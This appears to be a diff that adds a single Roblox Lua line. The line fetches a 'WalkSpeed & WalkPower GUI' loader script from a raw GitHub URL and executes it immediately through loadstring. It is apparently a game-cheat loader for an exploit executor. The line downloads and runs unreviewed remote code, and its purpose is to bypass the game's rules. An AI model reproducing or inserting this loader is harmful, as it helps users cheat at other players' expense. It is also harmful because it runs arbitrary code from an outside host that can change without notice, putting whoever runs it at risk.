@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Godfly123456/Polar-Hub/main/Modifiers/WalkSpeed%20%26%20WalkPower%20GUI/GUI%20Loader", true))()
